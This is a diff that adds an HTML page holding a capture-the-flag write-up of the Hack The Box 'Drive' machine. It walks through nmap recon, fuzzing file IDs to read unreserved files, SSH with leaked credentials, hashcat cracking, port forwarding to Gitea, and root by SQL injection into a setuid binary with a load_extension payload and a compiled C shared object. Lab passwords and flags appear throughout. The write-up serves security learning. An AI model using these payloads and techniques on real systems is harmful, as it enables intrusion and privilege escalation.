@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Drive</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Drive Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*SPXiJ6EzuZ1wzMhwUKp6jw.jpeg">
+            <h2>Recon</h2>
+            <p class="paragraph">
+                As always the first thing that I do is port scanning with nmap. There are 2 ports that open that is 22(ssh),<br>80(http), and 1 filtered port that is 3000. Then, the host running on ubuntu os and nginx 1.18 web server.
+                <p class="script-container">
+                    sudo nmap -sC -sV 10.10.11.235 -oN nmap.txt
+                </p>
+                <p class="script-container">
+                    ┌──(gh0st㉿kali)-[~/Documents/htb/drive]<br>
+                    └─$ nmap -sC -sV 10.10.11.235<br>
+                    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 21:15 PDT<br>
+                    Nmap scan report for drive.htb (10.10.11.235)<br>
+                    Host is up (0.29s latency).<br>
+                    Not shown: 997 closed tcp ports (conn-refused)<br>
+                    PORT     STATE    SERVICE VERSION<br>
+                    22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br>
+                    | ssh-hostkey: <br>
+                    |   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)<br>
+                    |   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)<br>
+                    |_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)<br>
+                    80/tcp   open     http    nginx 1.18.0 (Ubuntu)<br>
+                    |_http-title: Doodle Grive<br>
+                    |_http-server-header: nginx/1.18.0 (Ubuntu)<br>
+                    3000/tcp filtered ppp<br>
+                    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
+                </p>
+                Whatweb Scan
+                <p class="script-container">
+                    ┌──(yury㉿kali)-[~/Documents/htb/drive]
+└─$ whatweb 10.10.11.235
+http://10.10.11.235 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.235], RedirectLocation[http://drive.htb/], Title[301 Moved Permanently], nginx[1.18.0]<br>
+http://drive.htb/ [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, Email[customer-support@drive.htb,support@drive.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.235], JQuery[3.0.0], Script, Title[Doodle Grive], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]ive.htb/ [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, Email[customer-support@drive.htb,support@drive.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.235], JQuery[3.0.0], Script, Title[Doodle Grive], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]
+                </p>
+                So, after scanning, we found that there are three open ports: good ol’ port 80 for HTTP, the classic 22 for SSH, and a mysterious<br>3000 where something interesting is lurking. But, we’ll get to that in a bit.<br><br>
+                Now, onto the web stuff. First things first, you gotta throw “drive.htb” into your trusty old /etc/hosts file. No need to break a<br>sweat running any fancy dirb or gobuster scans because, believe me, there are no<br>secret hidden paths waiting to be uncovered.<br><br>
+                Just do the usual drill: sign up, create an account on the platform, and log in. No biggie! We’ll get to the juicy stuff soon enough. 😉
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*66ez5_m5R6Z089PxNAZ0Rg.png">
+            <p class="paragraph"> so here’s the scoop on the website — it’s basically a Google Drive clone, but with a reservation<br>system twist. You can reserve files for specific people, and only they can see’em. Or, you can be generous<br>and leave files unreserved for folks to snag for themselves. It’s all pretty straightforward, but here’s the kicker:<br>there’s a sneaky vulnerability lurking in there.<br><br>
+                To get to the bottom of things, we fire up Burp Suite and start dissecting how this whole shebang works.<br><br>
+                No time to waste, let’s dive straight into the juicy stuff! It turns out, to access a file, all you need to do is insert<br>the ID in the link. We can take advantage of this by fuzzing the URL<br>to uncover hidden files that aren’t reserved for us.<br><br>
+                To make this happen, we intercept the request and ship it over to our trusty sidekick, Burp Suite Intruder.<br>Let’s get ready to unveil some hidden treasures! 
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*yZZTtz5NFBW9RMLkgBUQQQ.png">
+            <p class="paragraph">
+                Absolutely, let’s get down to business. We add the ID to our list of arguments and set up the payload type.<br>Then, we tweak the options just right, following these settings, and hit that “Start<br>Attack” button:<br><br>
+                - Options: Make sure you’ve configured these settings to match your fuzzing strategy.<br><br>
+                Now, it’s game time! Hit “Start Attack” and let the fireworks begin.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*SjfT5B8V91HXt7wBWfxXbA.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*zI1DVYQsezvlZAdDTA6sAw.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*I_e-Abg4uLLVgtv8giFKOQ.png">
+            <p class="paragraph">
+                We’ve got a promising list there with IDs 101, 112, 79, 98, and 99. These files could<br>potentially hold some valuable secrets. Time to roll up our sleeves and find a way to access them.<br><br>
+                Start by prioritizing these IDs and focus on the 401 status codes. We’re on the right<br>track, and with some persistence and creativity, we’ll uncover what’s hidden within these files.<br><br>
+                So, after a bunch of poking around, we stumbled upon something interesting. Turns out,<br>there’s this /block link, and it’s a bit of a soft spot in the system. It doesn’t seem to care who <br>owns the file, so we had a wild idea — what if we could reserve files we’re not supposed to access?<br><br>
+                We put it to the test with those IDs we dug up earlier, and guess what? We hit paydirt!<br>Now, let’s dig deeper into what we uncovered.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Wg0tW7Rm8AqZdWNLvFT9zw.png">
+            <p class="paragraph">
+                With this golden ticket , we can now walk our way into the machine via SSH. 
+                <p class="script-container">
+                    ┌──(gh0st㉿kali)-[~/Documents/htb/drive]<br>
+                    └─$ ssh martin@drive.htb<br>           
+                    The authenticity of host 'drive.htb (10.10.11.235)' can't be established.<br>
+                    ED25519 key fingerprint is SHA256:peISHngFC65Dty34JUO7mwuE89m2GA0Z8GUFC7skwa0.<br>
+                    This key is not known by any other names.<br>
+                    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>
+                    Warning: Permanently added 'drive.htb' (ED25519) to the list of known hosts.<br>
+                    martin@drive.htb's password: <br>
+                    Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64)<br><br>
+
+                    * Documentation:  https://help.ubuntu.com<br>
+                    * Management:     https://landscape.canonical.com<br>
+                    * Support:        https://ubuntu.com/advantage<br><br>
+
+                    System information as of Thu 26 Oct 2023 05:12:35 AM UTC<br><br>
+
+                    System load:           0.02<br>
+                    Usage of /:            63.0% of 5.07GB<br>
+                    Memory usage:          20%<br>
+                    Swap usage:            0%<br>
+                    Processes:             227<br>
+                    Users logged in:       0<br>
+                    IPv4 address for eth0: 10.10.11.235<br>
+                    IPv6 address for eth0: dead:beef::250:56ff:feb9:8e7d<br><br><br>
+
+
+                    Expanded Security Maintenance for Applications is not enabled.<br><br>
+
+                    0 updates can be applied immediately.<br><br>
+
+                    Enable ESM Apps to receive additional future security updates.<br>
+                    See https://ubuntu.com/esm or run: sudo pro status<br><br>
+
+
+                    The list of available updates is more than a week old.<br>
+                    To check for new updates run: sudo apt update<br><br>
+
+                    martin@drive:~$
+                </p>
+                No worries, we’ve come this far, and we’re not giving up now. Let’s keep our<br>eyes peeled, do some more digging, and unravel the mystery of that elusive user flag. We’ve got<br>the persistence and skills to make it happen!
+            </p>
+            <h2>User flag</h2>
+            <p class="paragraph">
+                Our first discovery is a file named “gitea.” This seems to be a binary for a<br>Gitea server, and it’s likely hosted on port 3000. Gitea is a self-hosted Git service, so it might<br>hold some valuable information.
+                <p class="script-container">
+                    martin@drive:/usr/local/bin$ ls<br>
+                    cygdb  cython  cythonize  django-admin  gitea  gunicorn  pipreqs  sqlformat
+                </p>
+                Interesting finds keep piling up! The second set of noteworthy files you’ve come<br>across are database backup files. These can be treasure troves of information, and they’re often a<br>goldmine for uncovering secrets and vulnerabilities.<br><br>
+                Take a closer look at these database backups, as they could hold the key to unlocking<br>more about the system and potentially leading you to your next steps. Let’s dig in and see what’s hidden within those files!
+                <p class="script-container">
+                    martin@drive:/var/www/backups$ ls<br>
+                    1_Dec_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  db.sqlite3<br>
+                    1_Nov_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z
+                </p>
+                No worries, we’ve got a cool plan here! We’ve got these four 7z files with some mystery passwords<br>and a “db.sqlite3” file. Let’s roll with the Python server for a chill download session
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*1TxRymEjQdTtJBCebakqgA.png">
+            <p class="paragraph">
+                So, we decided to give those hashes a closer look and sorted them by ID. Here’s what we dug up:
+                <p class="script-container">
+                    ┌──(gh0st㉿kali)-[~/Documents/htb/drive]<br>
+                    └─$ hashid hash<br>                                                           
+                    --File 'hash'--<br>
+                    Analyzing 'sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3'<br>
+                    [+] Django(SHA-1) <br>
+                    [+] SAP CODVN F/G (PASSCODE)<br>
+                    --End of file 'hash'--<br>
+                </p>
+                Now, we’re trying our luck with Hashcat to crack these passwords.
+                <p class="script-container">
+                    ┌──(gh0st㉿kali)-[~/Documents/htb/drive]<br>
+                    └─$ hashcat -m 124  -a 0 --force -O hash /usr/share/wordlists/rockyou.txt
+                </p>
+                So, it turns out the only breakthrough we’ve had is Tom’s password.<br><br>
+                Now that we have Tom’s credentials, it’s time to explore what’s behind that door.
+                <p class="script-container">
+                    sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john31
+                </p>
+                Back to the drawing board! It seems Tom’s password didn’t quite do the trick, but that’s alright.<br><br>
+                Now, let’s pivot and head back to that Gitea file.
+                <p class="script-container">
+                    martin@drive:/usr/local/bin$ ./gitea
+                </p>
+                You’ve got a Gitea server set up on port 3000, but it’s playing hard to<br>get because it’s not accessible from outside the machine.<br><br>
+                Port forwarding will be our trusty tool to bridge that gap and give us the access we need.
+                <p class="script-container">
+                    ┌──(gh0st㉿kali)-[~/Documents/htb/drive]<br>
+                    └─$ ssh martin@10.10.11.235 -L 3000:YOUR IP:3000
+                </p>
+                Now, you’ve got access to the Gitea website via localhost:3000.<br><br>
+                With this direct access, you can explore the Gitea server and uncover what it holds. 
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*FRPrzVRUH8rpvd16VD0x2A.png">
+            <p class="paragraph">
+                Perfect! You’ve got the keys to the Gitea kingdom with the credentials “martinCruz:Xk4@KjyrYv8t194L!”<br><br>
+                Now that you’re in, it’s time to embark on your digital adventure. Head over to the one and only repository<br>and start your search for that golden nugget of useful information.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Hga3lwI4AZokuU_elNon5w.png">
+            <p class="paragraph">
+                We hit the bullseye and discovered some super valuable information inside that db_backup.sh file.
+                <p class="script-container">
+                    #!/bin/bash<br>
+                    DB=$1<br>
+                    date_str=$(date +'%d_%b')<br>
+                    7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3<br>
+                    cd /var/www/backups/<br>
+                    ls -l --sort=t *.7z > backups_num.tmp<br>
+                    backups_num=$(cat backups_num.tmp | wc -l)<br>
+                    if [[ $backups_num -gt 10 ]]; then<br>
+                        #backups is more than 10... deleting to oldest backup<br>
+                        rm $(ls  *.7z --sort=t --color=never | tail -1)<br>
+                        #oldest backup deleted successfully!<br>
+                    fi<br>
+                    rm backups_num.tmp<br>
+                </p>
+                Alright, check this out! We’ve gone through quite a bit. We cracked the 7z file passwords, got<br>ourselves some SQLite databases, and played Hashcat like a pro. Finally, we discovered that “johnmayer7”<br>is the magic key to the machine.<br><br>
+                Now, it’s just a quick SSH hop into the machine using Tom’s credentials to snag that user flag. 
+                <p class="script-container">
+                    ┌──(gh0st㉿kali)-[~/Documents/htb/drive]<br>
+                    └─$ ssh tom@drive.htb<br>                                  
+                    tom@drive.htb's password: <br>
+                    Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64)<br><br>
+
+                    * Documentation:  https://help.ubuntu.com<br>
+                    * Management:     https://landscape.canonical.com<br>
+                    * Support:        https://ubuntu.com/advantage<br><br>
+
+                    System information as of Thu 26 Oct 2023 08:19:38 AM UTC<br><br>
+
+                    System load:           0.04<br>
+                    Usage of /:            63.1% of 5.07GB<br>
+                    Memory usage:          22%<br>
+                    Swap usage:            0%<br>
+                    Processes:             246<br>
+                    Users logged in:       1<br>
+                    IPv4 address for eth0: 10.10.11.235<br>
+                    IPv6 address for eth0: dead:beef::250:56ff:feb9:8e7d<br><br><br>
+
+
+                    Expanded Security Maintenance for Applications is not enabled.<br><br>
+
+                    0 updates can be applied immediately.<br><br>
+
+                    Enable ESM Apps to receive additional future security updates.<br>
+                    See https://ubuntu.com/esm or run: sudo pro status<br><br><br>
+
+
+                    The list of available updates is more than a week old.<br>
+                    To check for new updates run: sudo apt update<br>
+                    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>
+
+
+                    Last login: Mon Oct  9 09:19:30 2023 from 10.10.14.40<br>
+                    tom@drive:~$ ls<br>
+                    doodleGrive-cli  README.txt  user.txt<br>
+                    tom@drive:~$ cat user.txt<br>
+                    e723a2a14561f1ed858a9285ba67eac7<br>
+                </p>
+                We found an interesting file, lets check it
+                <p class="script-container">
+                    tom@drive:~$ file doodleGrive-cli<br>
+                    doodleGrive-cli: setuid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=8c72c265a73f390aa00e69fc06d96f5576d29284, for GNU/Linux 3.2.0, not stripped
+                </p>
+                No sweat, we’ve got this covered. We’re using a Python server to grab that<br>user flag and bring it over to our local machine.
+            </p>
+            <h2>Privilege Escalation and Root</h2>
+            <p class="paragraph">
+                Got it, we’re diving into the tricky part now! 🚀 Running an SQL injection on a binary is quite the challenge. I won’t pester you about<br>the other ways since you’ve got your sights set on this method.<br><br>
+                Let’s begin by enumerating files with interesting SUID and GUID settings. We’re on the hunt for the best opportunities to make this happen. <br><br>
+                Alrighty, when we hit that login wall, it’s time to scoop up that binary and bring it over to good ol’ Windows. That’s where Ghidra comes<br>into play — it’s like the magic magnifying glass for binaries.<br><br>
+                Testing the code with “moriarty:findMeIfY0uC@nMr.Holmz!” is our game plan.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*iSNA5pijVLS7U7ad7J1XNA.png">
+            <p class="paragraph">
+                It looks like we might be able to pull off an RCE attack here. The main path we’re exploring, and perhaps the only<br>one suitable for our situation, is by exploiting the load_extension function in SQLite3.<br>You can check out more about it here: SQLite3 load_extension.<br><br>
+                After some extensive testing, we noticed that the application filters out the characters “.” and “/” from each input,<br>and it has a maximum input length of 35 characters. To get around the first limitation, we<br>can use the char() function to write our text in ASCII. For the second<br>limitation, we need to keep our file down to just one character to conserve space.<br><br>
+                To get started, we’ll create a C file that contains the code for our command. In my case, I needed to read the root flag,<br>so I ran a cat command on the root file. Unfortunately, I couldn't execute a reverse shell<br>or a root shell for some reason. So, I'll provide two versions: one for<br>running a specific command and one for getting a root shell.<br><br>
+                Keep it low-key and stay cautious.<br><br>
+                So we created a file called a.c
+                <p class="script-container">
+                    tom@drive:~$ cat a.c<br><br>
+
+                    #include <stdlib.h><br>
+                    #include <unistd.h><br>
+                    void sqlite3_a_init() {<br>
+                        setuid(0);<br>
+                        setgid(0);<br>
+                        system("/usr/bin/cat /root/root.txt > /tmp/a.txt");<br>
+                    }
+                </p>
+                Now we compile it
+                <p class="script-container">
+                    tom@drive:~$ gcc -shared a.c -o a.so -nostartfiles -fPIC
+                </p>
+                <p class="script-container">
+                    tom@drive:~$ ./doodleGrive-cli <br>
+                    [!]Caution this tool still in the development phase...please report any issue to the development team[!]<br>
+                    Enter Username:<br>
+                    moriarty<br>                     
+                    Enter password for moriarty:<br>
+                    findMeIfY0uC@nMr.Holmz!<br>
+                    Welcome...!<br><br>
+
+                    doodleGrive cli beta-2.2: <br>
+                    1. Show users list and info<br>
+                    2. Show groups list<br>
+                    3. Check server health and status<br>
+                    4. Show server requests log (last 1000 request)<br>
+                    5. activate user account<br>
+                    6. Exit<br>
+                    Select option: 5<br>
+                    Enter username to activate account: "+load_extension(char(46,47,97))+"<br>
+                    Activating account for user '"+load_extension(char(46,47,97))+"'...<br><br>
+
+                    doodleGrive cli beta-2.2: <br>
+                    1. Show users list and info<br>
+                    2. Show groups list<br>
+                    3. Check server health and status<br>
+                    4. Show server requests log (last 1000 request)<br>
+                    5. activate user account<br>
+                    6. Exit<br>
+                    Select option: 6<br>
+                    exiting...<br>
+                </p>
+                we used this specific payload here “+load_extension(char(46,47,97))+”<br><br>
+                NOW WE HAVE ROOT.
+                <p class="script-container">
+                    tom@drive:~$ cd ../../../<br>
+                    tom@drive:/$ ls<br>
+                    bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr<br>
+                    boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var<br>
+                    tom@drive:/$ cd tmp<br>
+                    tom@drive:/tmp$ ls<br>
+                    a.txt<br>
+                    systemd-private-1b06a77accc54542995c0e97bc5bdc04-ModemManager.service-As3J7e<br>
+                    systemd-private-1b06a77accc54542995c0e97bc5bdc04-systemd-logind.service-TTNEMf<br>
+                    systemd-private-1b06a77accc54542995c0e97bc5bdc04-systemd-resolved.service-9Bw9Li<br>
+                    systemd-private-1b06a77accc54542995c0e97bc5bdc04-systemd-timesyncd.service-BwY5Uh<br>
+                    vmware-root_730-2999460803<br>
+                    tom@drive:/tmp$ cat a.txt<br>
+                    2ed9b1df0b0b99e3df88cd42fb35cece<br>
+                    tom@drive:/tmp$ 
+                </p>
+                Thanks For Reading!!
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
